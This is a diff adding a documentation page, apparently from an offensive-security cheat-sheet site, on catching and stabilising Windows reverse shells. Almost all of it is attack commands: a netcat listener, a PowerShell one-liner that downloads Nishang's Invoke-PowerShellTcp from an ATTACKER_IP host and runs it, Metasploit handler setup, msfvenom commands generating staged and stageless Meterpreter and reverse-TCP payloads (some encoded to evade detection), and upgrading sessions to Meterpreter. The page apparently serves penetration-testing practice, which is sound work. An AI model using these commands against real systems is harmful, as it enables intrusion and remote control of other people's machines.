@@ -1,0 +1,121 @@
+---
+sidebar_position: 1
+title: Terminal
+description: Windows Shell Stabilization
+keywords: [shell stabilization windows, rlwrap, metasploit shell stabilization]
+---
+
+import Tabs from '@theme/Tabs';
+import TabItem from '@theme/TabItem';
+
+
+## CMD
+
+```batch
+:: In Windows we can use rlwrap before Connecting to the Target Machine
+rlwrap nc -nvlp $PORT
+```
+
+```powershell
+# After connecting to the Target we can Upload - Execute Invoke-PowerShellTcp [Nishang]
+# [An interactive PowerShell Reverse Connect]
+powershell IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP:PORT/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress $ATTACKER_IP -Port $PORT
+```
+
+- **Alternatively use one of the `MSFVENOM PAYLOADS:`** <a class="button button--outline button--warning" href="https://infosec-docs.pages.dev/windows/shell-win#payloads">PAYLOADS</a>
+
+
+### Interface
+
+```batch
+:: Enable Unicode Characters
+chcp 65001
+
+:: Set Keyboard Layout
+Set-WinUserLanguageList -LanguageList us-US -force
+```
+
+<br/>
+
+
+## Metasploit
+
+
+```batch
+:: Catching a Reverse Shell
+:: Load the Module
+use exploit/multi/handler
+
+:: Parameters
+set LHOST
+set LPORT
+
+:: Set the Correct PAYLOAD
+set PAYLOAD windows/shell/reverse_tcp
+```
+
+<br/>
+
+### PAYLOADS
+
+<Tabs>
+  <TabItem value="chisel_one" label="STAGED"> 
+    <div style={{color: 'red'}}>
+
+```batch
+:: Meterpreter
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f FORMAT -o OUTPUT
+
+:: Reverse TCP
+msfvenom -p windows/x64/shell/reverse_tcp LHOST=IP LPORT=PORT -f FORMAT -o OUTPUT
+
+:: Reverse TCP Encoded
+msfvenom -p windows/shell/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f FORMAT -o OUTPUT
+```
+
+</div>
+  </TabItem>
+  <TabItem value="chisel_two" label="STAGELESS">
+    <div style={{color: 'red'}}>
+
+```batch
+:: Meterpreter
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=IP LPORT=PORT -f FORMAT -o OUTPUT
+
+:: Reverse TCP
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f FORMAT -o OUTPUT
+
+:: Reverse TCP Encoded
+msfvenom -p windows/shell_reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f FORMAT -o OUTPUT
+```
+
+</div>
+  </TabItem>
+</Tabs>
+
+<br/>
+
+### Upgrading To Meterpreter
+
+
+```batch
+:: Background the SHELL: [CTRL+Z]
+:: Provide the Session Number
+sessions -u SESSION
+```
+
+```batch
+:: Background the SHELL: [CTRL+Z]
+:: Load the Module
+use multi/manage/shell_to_meterpreter
+
+:: Provide the Session Number
+:: [Method 1]
+run session=SESSION 
+
+:: [Method 2]
+run session=SESSION win_transfer=POWERSHELL
+
+:: [Method 3]
+run session=SESSION win_transfer=VBS
+```
